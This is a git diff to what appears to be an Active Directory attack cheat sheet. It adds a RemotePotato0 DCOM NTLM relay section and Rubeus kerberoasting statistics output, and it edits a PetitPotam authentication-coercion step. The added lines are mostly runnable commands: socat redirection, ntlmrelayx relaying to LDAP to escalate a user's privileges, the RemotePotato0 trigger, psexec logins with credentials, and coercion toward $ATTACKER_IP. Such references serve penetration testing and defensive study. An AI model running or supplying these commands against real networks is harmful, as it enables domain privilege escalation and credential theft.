@@ -61,6 +61,7 @@
       - [SMB Signing Disabled and IPv6](#smb-signing-disabled-and-ipv6)
       - [Drop the MIC](#drop-the-mic)
       - [Ghost Potato - CVE-2019-1384](#ghost-potato---cve-2019-1384)
+      - [RemotePotato0 DCOM DCE RPC relay](#remotepotato0-dcom-dce-rpc-relay)
       - [AD CS Relay Attack](#ad-cs-relay-attack)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
@@ -1380,8 +1381,16 @@ Any valid domain user can request a kerberos ticket (TGS) for any domain service
 
 * [Rubeus](https://github.com/GhostPack/Rubeus)
   ```powershell
+  # Stats
+  Rubeus.exe kerberoast /stats
+  -------------------------------------   ----------------------------------
+  | Supported Encryption Type | Count |  | Password Last Set Year | Count |
+  -------------------------------------  ----------------------------------
+  | RC4_HMAC_DEFAULT          | 1     |  | 2021                   | 1     |
+  -------------------------------------  ----------------------------------
+
   # Kerberoast (RC4 ticket)
-  .\rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt
+  Rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt
 
   # Kerberoast (AES ticket)
   # Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested.
@@ -1737,6 +1746,23 @@ Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impack
 ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
 ```
 
+#### RemotePotato0 DCOM DCE RPC relay 
+
+> It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine
+
+Requirement:
+
+* a shell in session 0 (e.g. WinRm shell or SSH shell)
+* a privileged user is logged on in the session 1 (e.g. a Domain Admin user)
+
+```powershell
+# https://github.com/antonioCoco/RemotePotato0/
+Terminal> sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 & # Can be omitted for Windows Server <= 2016
+Terminal> sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1
+Session0> RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2
+Terminal> psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'
+```
+
 #### AD CS Relay Attack
 
 Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101)
@@ -1748,7 +1774,7 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
     # template workstation, DomainController, Machine
 
     # Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam 
-    # You can also use any other way to coerce the authentication like printspooler
+    # You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN
     git clone https://github.com/topotam/PetitPotam
     python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
     python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
